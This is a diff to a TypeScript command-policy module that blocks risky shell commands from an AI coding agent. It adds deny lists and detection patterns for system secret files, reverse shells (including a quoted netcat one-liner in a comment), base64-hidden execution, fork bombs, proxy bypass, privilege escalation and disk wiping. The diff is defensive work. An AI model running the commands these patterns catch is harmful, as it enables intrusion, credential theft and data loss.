@@ -38,6 +38,10 @@ import { type OutboundCode, outboundUrlProblem } from "./outbound-url";
  *   and writes outside the mission folder, system services, uploads, remote
  *   shells, global installs, inline code, anything it can't read plainly).
  *   The judge only classifies what is left; the deny list stays first and hard.
+ * - `badActorReason`: the rule for a run outside a mission and for `run_code`,
+ *   where nobody answers a card: only obvious harm (secrets, more rights, the
+ *   system, a shell handed to another machine, wiping, the proxy and firewall,
+ *   the runner, other users' files), read through every wrapper.
  * - `localVerdict`: the part the computer decides by itself (the rest goes to
  *   the server, which may ask a person).
  *
@@ -412,12 +416,21 @@ const SECRET_KEY_FILES = ["*.pem", "*.key", "id_rsa", "id_ed25519", "id_ecdsa", 
 
 const escapeRe = (s: string) => s.replace(/[.*+?^${}()|[\]\\/]/g, "\\$&");
 
+/** The system's own secrets, by absolute path: password hashes, sudo rules, ssh host keys, a process's environment. */
+const SYSTEM_SECRETS = [
+  "^/etc/(shadow|gshadow|sudoers|master\\.passwd)$",
+  "^/etc/sudoers\\.d(/|$)",
+  "^/etc/ssh/ssh_host_",
+  "^/proc/[^/]+/environ$",
+  "^/(var/)?run/secrets(/|$)",
+] as const;
+
 /**
  * Secrets a read never gets: keys, tokens, env files (not their `.env.example`
  * and the like, which hold none), the runner's own home.
  */
 const SECRET_PATH = new RegExp(
-  `(^|/)(${SECRET_DIRS.map(escapeRe).join("|")})(/|$)|^~/(${HOME_SECRET_DIRS.map(escapeRe).join("|")})(/|$)|(^|/)(${SECRET_FILES.map(escapeRe).join("|")}|\\.env(\\.(?!(example|sample|template|dist|defaults)$)[\\w.-]+)?|id_[a-z0-9]+(\\.pub)?|.*\\.pem|.*\\.key)$|(^|/)(${SECRET_SIGN_IN_FILES.map((f) => escapeRe(f).replaceAll("\\*", "[^/]+")).join("|")})$`,
+  `(^|/)(${SECRET_DIRS.map(escapeRe).join("|")})(/|$)|^~/(${HOME_SECRET_DIRS.map(escapeRe).join("|")})(/|$)|(^|/)(${SECRET_FILES.map(escapeRe).join("|")}|\\.env(\\.(?!(example|sample|template|dist|defaults)$)[\\w.-]+)?|id_[a-z0-9]+(\\.pub)?|.*\\.pem|.*\\.key)$|(^|/)(${SECRET_SIGN_IN_FILES.map((f) => escapeRe(f).replaceAll("\\*", "[^/]+")).join("|")})$|${SYSTEM_SECRETS.join("|")}`,
   "i",
 );
 
@@ -453,8 +466,56 @@ const bareWord = (w: string) => {
  * runs in; a bare one is tested as written).
  */
 const namesSecret = (p: string, scope?: CommandScope) =>
-  SECRET_PATH.test(p) ||
-  (scope !== undefined && (p.startsWith("/") || p.startsWith("~") || p.includes("..")) && secretPath(scope, p));
+  pathsOf(p).some(
+    (q) =>
+      SECRET_PATH.test(q) ||
+      (scope !== undefined && (q.startsWith("/") || q.startsWith("~") || q.includes("..")) && secretPath(scope, q)),
+  );
+
+/** Names a wildcard may stand for in a secret's path (`~/.s?h`, `id_*`, `.env*`): the secret folders' and files' own. */
+const SECRET_NAMES = [
+  ...new Set([
+    ...SECRET_DIRS.map((d) => d.split("/").pop() as string),
+    ...SECRET_FILES,
+    ...SECRET_KEY_FILES.map((f) => f.replaceAll("*", "x")),
+    ".env",
+    "auth.json",
+  ]),
+];
+
+/** A path segment's wildcards as a pattern; like the shell, `*` and `?` don't match a leading dot. */
+const globPattern = (seg: string) =>
+  new RegExp(
+    `^${seg.startsWith(".") ? "" : "(?!\\.)"}${seg.replace(/\[(!?)([^\][]*)\]|[*?]|[^*?[]+|\[/g, (m, not, set) =>
+      m === "*"
+        ? "[^/]*"
+        : m === "?"
+          ? "[^/]"
+          : set !== undefined
+            ? `[${not ? "^" : ""}${set.replace(/[\\\]^]/g, "\\$&")}]`
+            : escapeRe(m),
+    )}$`,
+  );
+
+/**
+ * The paths a word may name, for the secret checks: as written, with Windows' backslashes as slashes, and with each
+ * wildcard segment replaced by the secret names it matches with at least half of their letters its own (`.s?h`,
+ * `id_*`, `.env*`; `*`, `.*` and `*.json` stay ordinary globs).
+ */
+function pathsOf(word: string): string[] {
+  const forms = word.includes("\\") ? [word, word.replaceAll("\\", "/")] : [word];
+  return forms.flatMap((w) => {
+    if (!/[*?[]/.test(w)) return [w];
+    let out = [""];
+    for (const [i, seg] of w.split("/").entries()) {
+      const own = /[*?[]/.test(seg) ? seg.replace(/\[[^\][]*\]|[*?]/g, "").length : 0;
+      const names = own >= 2 ? SECRET_NAMES.filter((n) => own * 2 >= n.length && globPattern(seg).test(n)) : [];
+      const parts = names.length ? names : [seg];
+      out = out.flatMap((o) => parts.map((part) => (i === 0 ? part : `${o}/${part}`))).slice(0, 64);
+    }
+    return [w, ...out];
+  });
+}
 
 /** Claude Code's own tools that read files, and the arguments that say where (Grep's `pattern` is a search, not a path). */
 const FILE_READ_TOOLS: Record<string, readonly string[]> = {
@@ -485,16 +546,26 @@ export function secretRead(
   const cmds = simpleCommands(command);
   if (cmds) {
     return cmds.some(
-      (s) => s.argv.slice(1).some((a) => namesSecret(a, scope)) || s.reads.some((r) => namesSecret(r, scope)),
+      (s) =>
+        s.argv.slice(1).some((a, n) => !sshKeyArg(s.argv, n + 1) && namesSecret(a, scope)) ||
+        s.reads.some((r) => namesSecret(r, scope)),
     );
   }
   // Not plainly readable: any word that names a secret.
-  return commandParts(command).some((part) =>
-    part
-      .split(" ")
-      .slice(1)
-      .some((w) => namesSecret(bareWord(w), scope)),
-  );
+  return commandParts(command).some((part) => {
+    const words = part.split(" ");
+    return words.slice(1).some((w, n) => !sshKeyArg(words, n + 1) && namesSecret(bareWord(w), scope));
+  });
+}
+
+/** ssh, scp and sftp read the key they are given (`-i`, `-o IdentityFile=`) to sign in; it never leaves the computer. */
+const SSH_CLIENTS = new Set(["ssh", "scp", "sftp"]);
+function sshKeyArg(argv: readonly string[], at: number) {
+  if (!SSH_CLIENTS.has((argv[0] ?? "").split("/").pop() ?? "")) return false;
+  const word = argv[at] ?? "";
+  const before = argv[at - 1] ?? "";
+  if (before === "-i" || /^-i\S/.test(word) || /^-oIdentityFile=/i.test(word)) return true;
+  return before === "-o" && /^IdentityFile=/i.test(word);
 }
 
 /** Commands that only read, whatever their arguments (minus the options that write or run). */
@@ -2028,39 +2099,634 @@ export function forbiddenReason(
   return null;
 }
 
+// ── A run outside a mission: only obvious harm is refused ─────────────────────
+
 /**
- * What to do instead of a refused call, by `forbiddenReason`: the agent hears
- * why it was refused, so it changes the call instead of resending the same
- * one with another path (a heredoc refused three times in one run).
+ * The person's and the computer's own credential stores, by path: what `badActorReason` refuses wherever a word names
+ * one. A project's own key files (`.env`, `*.pem`, `credentials.json`) aren't here: `secretRead` keeps the brain from
+ * reading those, and `run_code` works with them.
  */
-const FORBIDDEN_HINTS: Record<string, string> = {
-  "it can't be read plainly":
-    "Commands are checked word by word, so heredocs (<<), $(…), backticks, variables, `FOO=1 cmd` and & jobs are never run here. Write or change files with the Edit and Write tools, then run plain commands one at a time.",
-  "it writes outside the mission folder": "Write only inside your folder or /tmp.",
-  "it changes files outside the mission folder": "Change files only inside your folder or /tmp.",
-  "it runs other commands": "Run the commands themselves, one at a time, not through a shell, eval or xargs.",
-  "it runs code given inline":
-    "Code passed on the command line (node -e, python -c…) is never run without a person: write it to a file in your folder and run that file.",
-  "it touches secrets": SECRET_MESSAGE,
+const SECRET_STORE = new RegExp(
+  [
+    `(^|/)(${SECRET_DIRS.map(escapeRe).join("|")})(/|$)`,
+    `^~/(${HOME_SECRET_DIRS.map(escapeRe).join("|")})(/|$)`,
+    `(^|/)(${SECRET_FILES.filter((f) => !f.startsWith("credentials"))
+      .map(escapeRe)
+      .join("|")})$`,
+    `(^|/)(${SECRET_SIGN_IN_FILES.map((f) => escapeRe(f).replaceAll("\\*", "[^/]+")).join("|")})$`,
+    ...SYSTEM_SECRETS,
+  ].join("|"),
+  "i",
+);
+
+const storeSecret = (word: string, scope: CommandScope) => pathsOf(word).some((p) => storeSecretPath(p, scope));
+
+const storeSecretPath = (p: string, scope: CommandScope) => {
+  if (SECRET_STORE.test(p)) return true;
+  const r = resolveIn(scope, p);
+  if (r === null) return false;
+  const home = scope.home;
+  return (
+    SECRET_STORE.test(r) ||
+    (home !== undefined && HOME_SECRET_DIRS.some((d) => under(r, path.join(home, d)))) ||
+    (scope.runnerHome !== undefined && under(r, path.resolve(scope.runnerHome)))
+  );
 };
 
-export const forbiddenHint = (reason: string) => FORBIDDEN_HINTS[reason] ?? null;
+/** Folders whose files are the system's: `/usr/local` (Homebrew's, a user's own installs) and harmless devices aside. */
+const SYSTEM_DIRS =
+  /^\/(etc|usr(?!\/local(\/|$))|boot|sys|proc|bin|sbin|lib|lib32|lib64|System|Library|private\/etc|dev(?!\/(null|zero|stdout|stderr|tty|fd|shm)(\/|$)))(\/|$)/;
+/** What a recursive delete wipes the computer or a whole home with. */
+const WHOLE_TREE =
+  /^(\/+\*?|~\/?\*?|\$\{?HOME\}?\/?\*?|\/(home|Users|root|bin|boot|dev|etc|lib|lib64|opt|proc|sbin|srv|sys|usr|var|System|Library|Applications|private)\/?\*?)$/;
 
-/** `forbiddenReason`'s reasons as the code a refusal carries, so the apps say why in the person's words. */
-const FORBIDDEN_CODES: Record<string, string> = {
-  "it touches secrets": "secret",
-  "it can't be read plainly": "unclear",
-  "it writes outside the mission folder": "outside",
-  "it changes files outside the mission folder": "outside",
-  "it sends data or saves outside the mission folder": "upload",
-  "it changes the system": "system",
-  "it connects to another host": "remote",
-  "it runs other commands": "shell",
-  "it runs code given inline": "inline",
-  "it installs globally": "global",
+const PRIVILEGE = /^(sudo|sudoedit|su|doas|pkexec|run0)$/;
+const SYSTEM_TOOLS =
+  /^(mount|umount|swapon|swapoff|modprobe|insmod|rmmod|kexec|visudo|passwd|chpasswd|useradd|userdel|usermod|groupadd|groupdel|groupmod|adduser|deluser|shutdown|reboot|halt|poweroff|telinit|csrutil|nvram|kextload|kextunload|setenforce|grub-install|update-grub)$/;
+const WIPE_TOOLS = /^(mkfs(\..+)?|mke2fs|mkswap|wipefs|fdisk|sfdisk|cfdisk|gdisk|sgdisk|parted)$/;
+const FIREWALL_TOOLS =
+  /^(iptables|ip6tables|iptables-restore|ip6tables-restore|iptables-legacy|nft|ufw|firewall-cmd|pfctl)$/;
+const SYSTEMCTL_CHANGES =
+  /^(start|stop|restart|reload|try-restart|reload-or-restart|enable|disable|reenable|mask|unmask|kill|edit|set-property|isolate|daemon-reload|daemon-reexec|poweroff|reboot|halt|suspend|hibernate|link|revert|preset|set-default)$/;
+/** Programs that send what they read to another machine. */
+const SENDERS =
+  /^(curl|wget|nc|ncat|netcat|socat|telnet|ssh|scp|sftp|rsync|http|https|xh|mail|mailx|sendmail|openssl|ftp)$/;
+
+/** A shell's network redirection and the usual one-liners that hand a shell to another machine. */
+const SHELL_LITERAL = /["'`](\/bin\/)?(ba|z|da|k)?sh\b/;
+const REVERSE_SHELL: ReadonlyArray<readonly RegExp[]> = [
+  [/\/dev\/(tcp|udp)\//i],
+  [/\/inet6?\/(tcp|udp)\//],
+  // `cat /tmp/f | sh -i 2>&1 | nc host 4444 > /tmp/f`, `nc host 4444 < f | bash > f`: a shell reading a network tool.
+  [
+    /\b(ba|z|da|k)?sh\s+-i\b|\|\s*(\S*\/)?(ba|z|da|k)?sh\b(\s+-[is]\b)?\s*($|[|<>&;\d])|(^|[;&|(]\s*)(\S*\/)?(ba|z|da|k)?sh\s*</m,
+    /\b(nc|ncat|netcat|telnet|socat)\b|\bopenssl\s+s_client\b/,
+  ],
+  [/\bsocket\b/, /\bpty\.spawn\b|\bos\.dup2\b|\bdup2\s*\(/],
+  [/\bsocket\b|\bcreate_connection\b/, /\bstdin\s*=/, SHELL_LITERAL],
+  [/\bsocket\s*\(/i, /\bopen\s*\(\s*STD(IN|OUT|ERR)\s*,\s*["']?[>&]/],
+  [/IO::Socket/, /\b(system|exec)\b|fdopen|\/bin\/(ba)?sh/],
+  [/\bfsockopen\b/, /\b(exec|shell_exec|system|passthru|proc_open|popen)\s*\(|\/bin\/(ba)?sh/],
+  [/\bTCPSocket\b/, /\b(exec|spawn|system)\b|IO\.popen|\/bin\/(ba)?sh/],
+  [/\bnet\.(connect|createConnection|Socket)\b/, /\/bin\/(ba)?sh/],
+  [/\bnet\.(connect|createConnection|Socket)\b|require\(\s*["'](node:)?net["']\s*\)/, /child_process/, SHELL_LITERAL],
+];
+/** Code it hides by encoding it, then runs: `base64 -d | sh`, `eval "$(… | base64 -d)"`, `exec(b64decode(…))`. */
+const DECODE = String.raw`(\bbase64\b[^|;&\n]*\s(-d|-D|--decode)\b|\bxxd\b[^|;&\n]*\s-r\b|\bopenssl\s+(base64|enc)\b[^|;&\n]*\s-d\b)`;
+const ENCODED_RUN: ReadonlyArray<readonly RegExp[]> = [
+  // Piped into a shell or an interpreter that reads its program from that pipe (`| python3 -m json.tool` reads data).
+  [
+    new RegExp(
+      String.raw`${DECODE}[^;&\n]*\|\s*(\S*\/)?((ba|z|da|k)?sh|python[\d.]*|perl|ruby|node|php)\b(\s+-[\w-]*)*\s*($|[|;&)])`,
+      "m",
+    ),
+  ],
+  [new RegExp(String.raw`\b(eval|(ba|z|da|k)?sh\s+-c)\s+["']?\$\([^)]*${DECODE}`)],
+  [/\bb64decode\b|\batob\s*\(|["']base64["']/, /(?<![.\w])(exec|eval)\s*\(|\bnew\s+Function\b/],
+];
+/** The runner's own variables read (`$AGENTES_MCP_TOKEN`, `os.environ["AGENTES_RUNNER_HOME"]`), not their names in a search. */
+const RUNNER_VARIABLE =
+  /(\$\{?|environ\s*\[\s*["']|environ\.get\(\s*["']|getenv\(\s*["']|process\.env\.|process\.env\[\s*["']|ENV\[\s*["'])AGENTES_(RUNNER_HOME|MCP_TOKEN|MCP_SOCKET)\b/;
+const FORK_BOMB = /([\w:]+)\s*\(\s*\)\s*\{\s*\1\s*\|\s*\1\s*&/;
+/** The proxy variables set, emptied or dropped, in a shell or in code (`HTTPS_PROXY= curl`, `del os.environ["NO_PROXY"]`). */
+const PROXY_TEXT: readonly RegExp[] = [
+  /(^|\W)(https?|all|ftp|socks)_proxy["'\]]*\s*=(?!=)/i,
+  /\bunset\b[^\n;&|]*\b(https?|all|ftp)_proxy\b/i,
+  /\benv\b[^\n;&|]*\s-u\s*(https?|all|ftp)_proxy\b/i,
+  /\b(del|delete)\s[^\n;]*\b(https?|all)_proxy\b|\.pop\(\s*["'](https?|all)_proxy/i,
+];
+/** `NO_PROXY=…`'s value: what it sends around the proxy, fine while that is only this computer (`localhost,127.0.0.1`). */
+const NO_PROXY_VALUE = /(^|\W)no_proxy["'\]]*\s*=(?!=)\s*["']?([^"'\s;&|)]*)/gi;
+const LOCAL_HOST =
+  /^(\.?localhost|127(\.\d+){0,3}(\/\d+)?|::1|\[::1\]|0\.0\.0\.0|[\w-]+\.local|\.local|host\.docker\.internal)$/i;
+const proxyBypass = (text: string) =>
+  [...text.matchAll(NO_PROXY_VALUE)].some((m) =>
+    (m[2] ?? "").split(",").some((host) => host !== "" && !LOCAL_HOST.test(host.trim())),
+  );
+/** Code that sends its whole environment out: the dump and a network call in the same code. */
+const ENV_DUMP_CODE =
+  /JSON\.stringify\(\s*process\.env\s*\)|Object\.(entries|values)\(\s*process\.env\s*\)|\bdict\(\s*os\.environ\s*\)|\bos\.environ\.copy\(\)|\b(str|repr)\(\s*os\.environ\s*\)|json\.dumps\(\s*(dict\(\s*)?os\.environ\b|\bENV\.to_h\b/;
+const NET_CODE =
+  /\b(requests|urllib|httpx|aiohttp|http\.client|fetch|axios|https?\.(request|get)|socket|smtplib|Net::HTTP)\b/;
+
+/** One command found anywhere in a text, read loosely: no quoting rule makes it disappear. */
+interface Loose {
+  /** Its words as written, assignments and wrappers included. */
+  raw: string[];
+  /** The command itself: assignments, wrappers and shell keywords left out. */
+  argv: string[];
+  /** Files written with `>`, `>>`, `&>`. */
+  writes: string[];
+  /** Files read with `<`. */
+  reads: string[];
+}
+
+/** Programs whose quoted words are commands or code of their own (`bash -c '…'`, `python3 -c '…'`, `eval '…'`). */
+const RUNS_ITS_WORDS =
+  /^(sh|bash|zsh|dash|ksh|fish|busybox|eval|exec|xargs|watch|timeout|nohup|env|su|sudo|doas|runuser|flock|parallel|script|setsid|tmux|screen|systemd-run|python[\d.]*|node|nodejs|bun|deno|ruby|perl|php|g?awk|mawk|nawk)$/;
+const CODE_RUNNERS = /^(python[\d.]*|node|nodejs|bun|deno|ruby|perl|php|g?awk|mawk|nawk)$/;
+/** Programs that run the rest of their words as a command, after options of their own (`taskset -c 0 cmd`). */
+const LAUNCHERS =
+  /^(setsid|nice|ionice|stdbuf|taskset|chrt|unbuffer|caffeinate|systemd-run|xvfb-run|dbus-run-session|parallel|screen|runuser|cgexec|numactl|prlimit|strace|ltrace|setpriv|chpst)$/;
+/** What runs the text piped into it as commands (`echo '…' | bash`, `… | crontab -`). */
+const FED_COMMANDS = /^(sh|bash|zsh|dash|ksh|fish|at|batch|crontab)$/;
+const SHELL_KEYWORDS = new Set(["if", "then", "else", "elif", "do", "while", "until", "!", "exec", "time"]);
+const ASSIGNMENT = /^[A-Za-z_][A-Za-z0-9_]*=/;
+const HEREDOC = /(?<!<)<<-?\s*(['"]?)([A-Za-z_][\w.-]*)\1/g;
+
+function looseArgv(words: string[]): string[] {
+  let w = words;
+  for (let guard = 0; guard < 20 && w.length > 0; guard++) {
+    const head = baseName(w[0] as string);
+    if (ASSIGNMENT.test(w[0] as string) || SHELL_KEYWORDS.has(head)) w = w.slice(1);
+    else if (head === "timeout" || head === "xargs") {
+      w = w.slice(1);
+      while (w[0]?.startsWith("-")) w = w.slice(/^-[IdEsLnPak]$/.test(w[0]) ? 2 : 1);
+      if (head === "timeout") w = w.slice(1);
+    } else {
+      const u = unwrapped(w);
+      if (u.length === w.length) return w;
+      w = u;
+    }
+  }
+  return w;
+}
+
+/**
+ * A shell text's lines with each heredoc's body taken out, and those bodies with the program that runs them (the
+ * one it feeds, or the one that is piped on): a body fed to `cat` or `tee` is a file's text, not commands.
+ */
+function heredocs(text: string): { shell: string; bodies: Array<{ runner: string; body: string }> } {
+  if (!text.includes("<<")) return { shell: text, bodies: [] };
+  const lines = text.split("\n");
+  const kept: string[] = [];
+  const bodies: Array<{ runner: string; body: string }> = [];
+  for (let i = 0; i < lines.length; i++) {
+    const line = lines[i] as string;
+    kept.push(line.replace(HEREDOC, " "));
+    for (const m of line.matchAll(HEREDOC)) {
+      let end = i + 1;
+      while (end < lines.length && (lines[end] as string).replace(/^\t+/, "").trimEnd() !== m[2]) end++;
+      const owner = baseName(
+        looseArgv(
+          (
+            line
+              .slice(0, m.index)
+              .split(/[;&|(]/)
+              .pop() ?? ""
+          )
+            .split(/\s+/)
+            .filter(Boolean),
+        )[0] ?? "",
+      );
+      const next = baseName(/\|\s*(\S+)/.exec(line.slice((m.index ?? 0) + m[0].length))?.[1] ?? "");
+      const runs = (p: string) => SHELL_NAMES.test(p) || CODE_RUNNERS.test(p);
+      bodies.push({ runner: runs(next) ? next : owner, body: lines.slice(i + 1, end).join("\n") });
+      i = end;
+    }
+  }
+  return { shell: kept.join("\n"), bodies };
+}
+
+/**
+ * Every command a text may run, read loosely into `out`: lists, pipes, `$(…)`, backticks, a shell's or an
+ * interpreter's quoted script, a heredoc fed to one (`code`: the text is Python or JavaScript, where every string may
+ * be a command: `os.system("…")`, `subprocess.run(["…"])`). A quoted word given to anything else (a commit message, a
+ * remote command for ssh) is a word.
+ */
+function looseScan(text: string, code: boolean, depth: number, out: Loose[]): void {
+  if (depth > 4) return;
+  const { shell, bodies } = code ? { shell: text, bodies: [] } : heredocs(text);
+  for (const b of bodies) {
+    if (SHELL_NAMES.test(b.runner)) looseScan(b.body, false, depth + 1, out);
+    else if (CODE_RUNNERS.test(b.runner)) looseScan(b.body, true, depth + 1, out);
+  }
+  let words: string[] = [];
+  let quoted: string[] = [];
+  let writes: string[] = [];
+  let reads: string[] = [];
+  let cur = "";
+  let has = false;
+  let target: "write" | "read" | null = null;
+  const endWord = () => {
+    if (has) {
+      (target === "write" ? writes : target === "read" ? reads : words).push(cur);
+      target = null;
+    }
+    cur = "";
+    has = false;
+  };
+  let fed: string[] = [];
+  const endCommand = (sep?: string) => {
+    endWord();
+    const argv = looseArgv(words);
+    if (words.length || writes.length || reads.length) out.push({ raw: words, argv, writes, reads });
+    const head = baseName(argv[0] ?? "");
+    const rawHead = baseName(words.find((w) => !ASSIGNMENT.test(w)) ?? "");
+    // Text piped from `echo` or `printf` into a shell, a code runner or cron: commands too.
+    for (const f of fed) {
+      if (FED_COMMANDS.test(head)) looseScan(f.replace(/^\s*(@\w+\s+|(\S+\s+){5})/gm, ""), false, depth + 1, out);
+      else if (CODE_RUNNERS.test(head)) looseScan(f, true, depth + 1, out);
+    }
+    fed = sep === "|" && /^(echo|printf)$/.test(head) ? [...quoted, argv.slice(1).join(" ")] : [];
+    if (LAUNCHERS.test(head)) {
+      for (let k = 1; k < argv.length && k < 8; k++) {
+        if (!(argv[k] as string).startsWith("-"))
+          out.push({ raw: argv.slice(k), argv: looseArgv(argv.slice(k)), writes: [], reads: [] });
+      }
+    }
+    if (head === "find") {
+      const at = argv.findIndex((a) => /^-(exec|execdir|ok|okdir)$/.test(a));
+      if (at >= 0) out.push({ raw: argv.slice(at + 1), argv: looseArgv(argv.slice(at + 1)), writes: [], reads: [] });
+    }
+    if (code || RUNS_ITS_WORDS.test(head) || RUNS_ITS_WORDS.test(rawHead)) {
+      for (const q of quoted) looseScan(q, !code && CODE_RUNNERS.test(head), depth + 1, out);
+    }
+    words = [];
+    quoted = [];
+    writes = [];
+    reads = [];
+    target = null;
+  };
+  for (let i = 0; i < shell.length; i++) {
+    const c = shell[i] as string;
+    if (c === "'" || c === '"') {
+      let j = i + 1;
+      while (j < shell.length && shell[j] !== c) j += c === '"' && shell[j] === "\\" ? 2 : 1;
+      const inner = shell.slice(i + 1, j);
+      cur += inner;
+      has = true;
+      // What `$(…)` and backticks run inside double quotes runs whoever gets the word.
+      if (!code && c === '"' && /\$\(|`/.test(inner)) looseScan(inner, false, depth + 1, out);
+      else if (!code || /[\s;&|]/.test(inner)) quoted.push(inner);
+      i = j;
+      continue;
+    }
+    if (c === "\\") {
+      if (i + 1 < shell.length) cur += shell[i + 1];
+      has = true;
+      i++;
+      continue;
+    }
+    if (c === "$" && shell[i + 1] === "{") {
+      const end = shell.indexOf("}", i);
+      const stop = end < 0 ? shell.length : end;
+      cur += shell.slice(i, stop + 1);
+      has = true;
+      i = stop;
+      continue;
+    }
+    if ((c === "$" || c === "<" || c === ">") && shell[i + 1] === "(") {
+      endCommand();
+      i++;
+      continue;
+    }
+    if (c === "&" && shell[i + 1] === ">") {
+      endWord();
+      i += shell[i + 2] === ">" ? 2 : 1;
+      target = "write";
+      continue;
+    }
+    if (c === ">") {
+      if (/^\d+$/.test(cur)) {
+        cur = "";
+        has = false;
+      } else endWord();
+      while (shell[i + 1] === ">" || shell[i + 1] === "|") i++;
+      // `2>&1`, `>&2`: a descriptor, not a file.
+      if (shell[i + 1] === "&" && /[\d-]/.test(shell[i + 2] ?? "")) {
+        i += 2;
+        continue;
+      }
+      target = "write";
+      continue;
+    }
+    if (c === "<") {
+      endWord();
+      if (shell.startsWith("<<<", i)) i += 2;
+      else target = "read";
+      continue;
+    }
+    if (";&|\n(){}`".includes(c)) {
+      endCommand(c);
+      continue;
+    }
+    if (c === " " || c === "\t" || c === "\r" || (code && (c === "," || c === "[" || c === "]"))) {
+      endWord();
+      continue;
+    }
+    cur += c;
+    has = true;
+  }
+  endCommand();
+}
+
+const SECRETS = "it touches secrets";
+const ENCODED = "it runs code it hides by encoding it";
+const ENV_OUT = "it sends out its whole environment, which holds its keys";
+const PRIVILEGE_REASON = "it asks for more rights than the agent's own user has";
+const SYSTEM_REASON = "it changes the system";
+const RUNNER = "it touches the runner that connects this computer";
+const REVERSE = "it hands a shell on this computer to another machine";
+const WIPE = "it would wipe the computer or a whole home folder";
+const NETWORK = "it changes or goes around the computer's proxy and firewall";
+const OTHER = "it reaches into another user's files";
+
+/** What a refusal of each reason carries: the code the apps say in the person's words, and what to do instead. */
+const BAD_ACTOR: Record<string, { code: string; hint: string }> = {
+  [SECRETS]: { code: "secret", hint: SECRET_MESSAGE },
+  [ENV_OUT]: { code: "secret", hint: "Send only the values the work needs, each by its name." },
+  [ENCODED]: { code: "unclear", hint: "Run the commands or the code themselves, as plain text, so they can be read." },
+  [PRIVILEGE_REASON]: {
+    code: "privilege",
+    hint: "Run it as the agent's own user, without sudo: installs into its own user work (npm i -g, pip install --user, cargo install).",
+  },
+  [SYSTEM_REASON]: {
+    code: "system",
+    hint: "Keep changes to your own files and user; system folders (/etc, /usr, /boot…), system services, disks and kernel settings stay as they are.",
+  },
+  [RUNNER]: { code: "system", hint: "Leave the runner, its files and its process as they are." },
+  [REVERSE]: {
+    code: "reverseShell",
+    hint: "To work on another machine, connect out to it with ssh, or call its API with curl.",
+  },
+  [WIPE]: { code: "destroy", hint: "Delete only the files and folders the work itself made, by their paths." },
+  [NETWORK]: {
+    code: "network",
+    hint: "Leave the proxy variables, the firewall and the routes as they are; if an address can't be reached, tell the person which one.",
+  },
+  [OTHER]: { code: "otherUser", hint: "Work in your own folder and home." },
 };
 
-export const forbiddenCode = (reason: string) => FORBIDDEN_CODES[reason] ?? "rules";
+/** A refusal by `badActorReason`: the real reason, what to do instead, and that the rest of the work goes on. */
+export function badActorRefusal(reason: string): { message: string; code: string } {
+  const r = BAD_ACTOR[reason];
+  return {
+    message: `This was refused because ${reason}. ${r ? `${r.hint} ` : ""}Plain commands, scripts, installs, ssh and HTTP calls of any kind still run, so carry on with the rest of the work; if it truly needs this step, tell the person in plain words what is needed and why. ${NO_TERMINAL_COMMANDS}`,
+    code: r?.code ?? "rules",
+  };
+}
+
+/** An address or another machine's path (`host:/srv`, `user@host:~/x`): not this computer's file (`C:\\x` is). */
+const elsewhere = (p: string) =>
+  !/^[a-z]:[\\/]/i.test(p) &&
+  (/^[a-z][\w+.-]*:\/\//i.test(p) || (!p.startsWith("/") && /^([\w.-]+@)?[\w.-]+:/.test(p)));
+
+/** A path in another user's home (`/home/x`, `/Users/x`, `/root`, `~x`) where neither the agent's home nor its folders are. */
+function otherHome(p: string, scope: CommandScope) {
+  if (!scope.home) return false;
+  if (/^~[A-Za-z_]/.test(p)) return true;
+  if (!p.startsWith("/")) return false;
+  const m = /^\/((home|Users)\/[^/]+|root)(\/|$)/.exec(path.resolve(p));
+  if (!m || m[1] === "Users/Shared") return false;
+  const top = `/${m[1]}`;
+  return ![scope.home, scope.cwd, ...scope.folders].some((f) => under(path.resolve(f), top));
+}
+
+/** Why a word a command reads or names is refused: a credential store, the runner, another user's home. */
+function wordProblem(word: string, scope: CommandScope): string | null {
+  const p = word
+    .replace(/^--?[\w-]+=/, "")
+    .replace(/^[A-Za-z_]\w*=/, "")
+    .replace(/^[@<]/, "")
+    .replace(/^file:\/\//, "");
+  if (!p || elsewhere(p)) return null;
+  if (/agentes-runner/i.test(p) && /[/\\~]/.test(p) && !insideFolders(scope, p)) return RUNNER;
+  if (storeSecret(p, scope)) return SECRETS;
+  return otherHome(p, scope) ? OTHER : null;
+}
+
+/** Why a file a command writes is refused: the system's, a credential store (a project's `.env` aside), the runner's. */
+function writeProblem(file: string, scope: CommandScope): string | null {
+  if (!file || elsewhere(file)) return null;
+  if (/agentes-runner/i.test(file) && !insideFolders(scope, file)) return RUNNER;
+  const r = resolveIn(scope, file);
+  if (r === null) return OTHER;
+  if (SYSTEM_DIRS.test(r)) return SYSTEM_REASON;
+  if (storeSecret(file, scope)) return SECRETS;
+  return otherHome(file, scope) ? OTHER : null;
+}
+
+const DEST_LAST = new Set(["cp", "mv", "ln", "install", "rsync"]);
+const EVERY_ARG = new Set([
+  "tee",
+  "touch",
+  "mkdir",
+  "rm",
+  "rmdir",
+  "truncate",
+  "unlink",
+  "shred",
+  "chmod",
+  "chown",
+  "chgrp",
+  "chattr",
+  "chflags",
+]);
+
+/** The files a command writes, deletes or changes the mode of: its redirections, and its arguments by what it is. */
+function writeTargets(cmd: string, args: readonly string[], redirects: readonly string[]): string[] {
+  const plain = args.filter((a) => !a.startsWith("-"));
+  const out = [...redirects];
+  if (DEST_LAST.has(cmd)) {
+    const t = args.findIndex((a) => a === "-t" || a === "--target-directory");
+    const glued = args.find((a) => a.startsWith("--target-directory="));
+    out.push(glued?.slice(19) ?? (t >= 0 ? (args[t + 1] ?? "") : (plain.at(-1) ?? "")));
+  } else if (
+    EVERY_ARG.has(cmd) ||
+    ((cmd === "sed" || cmd === "perl") && args.some((a) => /^-[a-zA-Z]*i|^--in-place/.test(a)))
+  ) {
+    out.push(...plain);
+  } else if (cmd === "dd") out.push(...args.filter((a) => a.startsWith("of=")).map((a) => a.slice(3)));
+  return out.filter(Boolean);
+}
+
+/** Whether the words print the whole environment (`env`, `printenv`, `set`, `export -p`, `declare -x`). */
+function envDump(raw: readonly string[]) {
+  const [head = "", ...rest] = raw.filter((w) => !ASSIGNMENT.test(w));
+  const b = baseName(head);
+  return (
+    ((b === "env" || b === "printenv") && rest.every((a) => a.startsWith("-"))) ||
+    (b === "set" && rest.length === 0) ||
+    (b === "export" && rest.length === 1 && rest[0] === "-p") ||
+    (b === "declare" && /^-[a-zA-Z]*[xp]/.test(rest[0] ?? "")) ||
+    (b === "compgen" && rest[0] === "-v")
+  );
+}
+
+/** Whether a path is the whole computer, a top-level folder or a whole home (`rm -rf ../../..`, `rm -rf /home/ada`). */
+function wholeTree(word: string, scope: CommandScope) {
+  if (WHOLE_TREE.test(word)) return true;
+  const r = resolveIn(scope, word.replace(/\/\*$/, ""));
+  return (
+    r !== null &&
+    (WHOLE_TREE.test(r) ||
